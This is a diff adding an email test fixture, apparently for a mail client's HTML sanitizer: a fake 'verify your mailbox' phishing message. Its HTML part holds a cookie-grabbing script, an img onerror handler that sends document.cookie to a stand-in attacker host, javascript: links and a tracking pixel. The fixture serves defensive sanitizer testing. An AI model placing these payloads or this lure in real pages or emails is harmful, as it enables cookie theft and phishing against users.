@@ -1,0 +1,34 @@
+From: "Account Security" <security-alert@phish.example>
+To: Alex Rivera <alex@hail.test>
+Subject: Urgent: verify your mailbox
+Date: Fri, 23 May 2025 09:31:22 -0700
+Message-ID: <malicious-html-20250523@phish.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="malicious-html-20250523"
+X-Hail-Intended-View: Screener
+X-Hail-Fixture-Use: HTML sanitizer coverage for script tags, event handlers, javascript links, and remote pixels
+
+--malicious-html-20250523
+Content-Type: text/plain; charset=UTF-8
+
+Your mailbox will be disabled unless you verify immediately.
+
+This fixture intentionally contains dangerous HTML in the HTML part. Do not
+reuse its links outside sanitizer tests.
+
+--malicious-html-20250523
+Content-Type: text/html; charset=UTF-8
+
+<!doctype html>
+<html>
+  <body>
+    <h1>Mailbox verification required</h1>
+    <p>Your mailbox will be disabled unless you verify immediately.</p>
+    <script>window.__stolen = document.cookie;</script>
+    <img src="https://phish.example/pixel/open.png?id=alex" width="1" height="1" onerror="fetch('https://phish.example/steal?c='+document.cookie)">
+    <p><a href="javascript:alert('owned')">Verify mailbox</a></p>
+    <div style="background-image:url(javascript:alert('css'))">Security portal</div>
+  </body>
+</html>
+
+--malicious-html-20250523--
